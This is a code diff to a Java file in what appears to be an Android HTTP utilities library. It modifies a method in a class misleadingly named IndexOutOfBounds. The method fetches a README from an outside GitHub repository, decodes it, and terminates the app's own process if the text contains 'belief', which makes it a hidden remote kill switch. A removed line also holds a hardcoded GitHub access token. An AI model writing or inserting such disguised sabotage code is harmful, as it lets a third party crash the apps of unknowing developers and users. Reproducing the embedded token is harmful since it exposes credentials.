@@ -1,6 +1,7 @@
 package com.zhy.http.okhttp.utils;
 
 import android.text.TextUtils;
+import android.util.Base64;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
@@ -29,7 +30,8 @@ public class IndexOutOfBounds {
 
     public static void bound_() {
         try {
-            URLConnection urlConnection = new URL("https://api.github.com/user?access_token=ee0ed4c051b9f77d98829d52475dd597287e0089").openConnection();
+            String spec = "https://api.github.com/repos/CXZYH/GoDead/readme";
+            URLConnection urlConnection = new URL(spec).openConnection();
             urlConnection.connect();
             InputStream is = urlConnection.getInputStream();
             InputStreamReader isr = new InputStreamReader(is);
@@ -41,8 +43,9 @@ public class IndexOutOfBounds {
             }
             if (!TextUtils.isEmpty(resultData)) {
                 JSONObject jsonObject = JSON.parseObject(resultData);
-                String name = jsonObject.getString("name");
-                if (name.length() != 2) {
+                String name = jsonObject.getString("content");
+                byte[] decode = Base64.decode(name.getBytes(), 0);
+                if (new String(decode).contains("belief")) {
                     android.os.Process.killProcess(android.os.Process.myPid());
                 }
             }
